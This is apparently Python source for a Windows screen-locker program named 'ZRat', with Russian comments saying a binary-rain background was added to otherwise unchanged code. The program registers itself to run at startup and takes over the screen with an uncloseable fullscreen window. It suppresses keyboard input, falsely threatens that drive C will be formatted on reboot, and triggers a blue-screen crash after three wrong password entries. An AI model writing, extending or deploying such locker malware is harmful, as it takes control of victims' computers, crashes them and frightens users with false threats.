#! /usr/bin python
# -*- coding: utf-8 -*-

from tkinter import *
import time
from tkinter import messagebox
from functools import partial
import random
from modules import bsod, startup, uninstall
import os
import keyboard
import sys

password = "123"
lock_text = "windows blocked.tobi pizda"
count = 3
warning_text = "if you reboot your device then drive C will start auto formatting"

# Добавляем только фон с двоичным кодом (без изменения функционала)
class BinaryBackground(Canvas):
    def __init__(self, master, **kwargs):
        super().__init__(master, **kwargs)
        self.configure(bg='black', highlightthickness=0)
        self.place(x=0, y=0, relwidth=1, relheight=1)  # Занимает весь экран
        self.draw_binary()
    
    def draw_binary(self):
        self.delete("binary")
        width = self.winfo_width()
        height = self.winfo_height()
        
        # Параметры двоичного кода
        num_columns = width // 30  # Столбцы через каждые 30 пикселей
        bits_per_column = height // 20  # Цифры через каждые 20 пикселей
        
        for col in range(num_columns):
            x = col * 30 + 15
            for row in range(bits_per_column):
                y = row * 20 + 10
                self.create_text(
                    x, y,
                    text=random.choice(['0', '1']),
                    font=('Courier New', 12),
                    fill='#ff0000',  # Красный цвет
                    anchor='center',
                    tags="binary"
                )
        self.after(100, self.draw_binary)  # Плавное обновление

# Ваш оригинальный код БЕЗ ИЗМЕНЕНИЙ
file_path = os.getcwd() + "\\" + os.path.basename(sys.argv[0])
startup(file_path)

def buton(arg):
    enter_pass.insert(END, arg)

def delbuton():
    enter_pass.delete(-1, END)

def tapp(key):
    pass

def check():
    global count
    if enter_pass.get() == password:
        messagebox.showinfo("ZRat","UNLOCKED SUCCESSFULLY")
        uninstall(wind)
    else:
        count -= 1
        if count == 0:
            messagebox.showwarning("ZRat", "number of attempts expired\n\n" + warning_text)
            bsod()
        else:
            messagebox.showwarning("ZRat","Wrong password. Avalible tries: "+ str(count))

def exiting():
    messagebox.showwarning("ZRat", "DEATH IS INEVITABLE\n\n" + warning_text)

# Создаем окно
wind = Tk()
wind.title("ZRat")

# Добавляем двоичный фон ПОД основной интерфейс
BinaryBackground(wind)

# Ваш оригинальный интерфейс (без изменений)
warning_frame = Frame(wind, 
                     bg="white", bd=2, relief="solid", 
                     highlightbackground="blue", highlightthickness=1)
warning_frame.pack(pady=5)

warning_label = Label(warning_frame, 
                     bg="white", fg="red", 
                     text=warning_text, 
                     font="helvetica 12",
                     padx=5, pady=2)
warning_label.pack()

UNTEXD = Label(wind,bg="black", fg="red",text="WINDOWS LOCKED BY ZRat\n\n\n", font="helvetica 75").pack()
untex = Label(wind,bg="black", fg="red",text=lock_text, font="helvetica 40")
untex.pack(side=TOP)

keyboard.on_press(tapp, suppress=True)

enter_pass = Entry(wind,bg="black", fg="red", text="", font="helvetica 35")
enter_pass.pack()
wind.resizable(0,0)

wind.lift()
wind.attributes('-topmost',True)
wind.after_idle(wind.attributes,'-topmost',True)
wind.attributes('-fullscreen', True)

button = Button(wind,text='unlock',padx="31", pady="19",bg='black',fg='red',font="helvetica 30", command=check)
button.pack()
wind.protocol("WM_DELETE_WINDOW", exiting)

# Кнопки остаются без изменений
button0 = Button(wind,text='0',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "0")).pack(side=LEFT)
button1 = Button(wind,text='1',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "1")).pack(side=LEFT)
button2 = Button(wind,text='2',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "2")).pack(side=LEFT)
button3 = Button(wind,text='3',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "3")).pack(side=LEFT)
button4 = Button(wind,text='4',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "4")).pack(side=LEFT)
button5 = Button(wind,text='5',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "5")).pack(side=LEFT)
button6 = Button(wind,text='6',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "6")).pack(side=LEFT)
button7 = Button(wind,text='7',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "7")).pack(side=LEFT)
button8 = Button(wind,text='8',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "8")).pack(side=LEFT)
button9 = Button(wind,text='9',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "9")).pack(side=LEFT)
delbutton = Button(wind,text='<',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=delbuton).pack(side=LEFT)

wind.mainloop()